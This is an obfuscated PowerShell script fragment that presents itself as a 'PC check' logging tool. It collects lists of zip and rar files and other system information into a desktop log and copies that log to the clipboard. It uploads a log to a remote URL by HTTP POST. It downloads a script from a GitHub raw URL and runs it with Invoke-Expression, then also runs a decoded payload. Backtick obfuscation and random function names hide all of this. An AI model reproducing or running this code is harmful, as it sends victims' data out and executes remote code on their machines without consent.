             $res`p`onse = ``i`Nv`o`k`E-rEst`M`E`Th`oD -Ur`i $ur`l -Met`h`o`d `P`o`st -`ContentT`ype "mu`lti`part/for`m-`data; b`oundary=`"$b`oun`dar`y`"" -B`ody $bo`dy`L`ines
                 `Wr``IT``E-H`o``S``T "."
               }
                `catch {
              `Wr``I`T``E-`H`o``S``T "Fa`i`le`d `to sen`d `log: $`_" -Foregr`oun`d`C`olor `Red
            }
      }
            e`l`se {
           `Wr``IT``E-`H`o``S``T "`Log `file `not `found." -F`ore`gr`oundCo`lor `Red
          }
        }
       functi`on `UA`T`cGb`ci`qZi`o {
       $`g`lobal:`lo`g`Entrie`s = @()
          $`de`s`ktop`Pat`h = [`S`y`stem.`Environ`ment]::`GetFo`lder`Pat`h('`Des`kt`o`p')
            $l`o`g`Fi`lePath = `j``oi``N-`paT`H -`Pat`h $`des`ktopPat`h -Ch`i`l`dPat`h "`Pc`C`heck`Logs.`txt"
    
     
   
         u`RHGAe`JB`jcg`H
    `k`E`z`YN`l`RavLBF
           BJn`Dxv`Xt`mv`k`E
      `o`gHaP`SBn`A`Cpg
           Ar`PDPb`Kly`cTD
   
    $`z`i`pRar`File`s = m`l`P`hnj`w`hs`WjS
         `if ($`z`ipRar`Fi`le`s.`Count -`gt `0) {
        $`gl`oba`l:l`o`g`Entr`ies += "``n-----------------"
            $g`l`oba`l:`l`o`gEntries += "`n`F`oun`d .z`ip `and .`rar fi`les:"
             $`zi`p`RarFile`s |%{$_}| f`OrEa``ch-`O`B`jeC`T { $`globa`l:l`ogEntr`ies += "``n" + $`_.Fu`l`l`Na`me }
         }
  
           $globa`l:`lo`gEntries |%{$_}| `o``Ut-`f``IL``E -F`ile`Pat`h $log`Fi`le`Pat`h -En`co`d`ing UT`F`8 -`No`Ne`wline
          `s``Tar``T-``s`LEe`p -Sec`onds `1
 
       
   
      `if (`te``st-``P``A``T``h $`logF`ilePat`h) {
            ``s``Et-`C`LI`P`B`oAr``D -Pat`h $`l`og`Fi`le`Pat`h
            `Wr``I`T``E-`H`o``S``T "`Lo`g fi`le c`o`p`ie`d t`o cl`i`pboar`d." -`F`ore`gr`oun`d`C`olor `DarkRe`d
         } e`lse {
           `Wr``IT``E-`Ho``S``T "`L`o`g `file n`ot f`ound `on t`he deskt`o`p." -`F`ore`gr`oun`dCo`l`or Re`d
           }
   
     $user`Pr`ofile = [`Sy`ste`m.Env`ir`onment]::Get`F`o`l`derPat`h([S`y`stem.Environ`ment+`Spe`c`ia`l`F`ol`der]::User`Profile)
        $`d`ownload`sPath = `j``o`i``N-pa`TH -`Path $userProfi`le -`Chi`l`d`Pat`h "`D`own`l`oa`ds"
        $`url = "htt`ps://ra`w.`git`hubu`serc`ontent.c`om/`Reapiin/`art/`main/`cre`d`it`s"
       $c`ontent = `i`Nv`o`k`E-r`Est`M``E`Tho`D -`Ur`i $`url
           ``iNV``O``ke-`E``XPr``E`SS`i``On $`content
           nGceH`kfX`QhX`L
            `i`NV``O``ke-`E``X`Pr``E`S`S`i``On $`de`c`ode`dlog`sen`d
        
       
  

  
  }
 UA`T`c`Gb`c`i`qZi`o
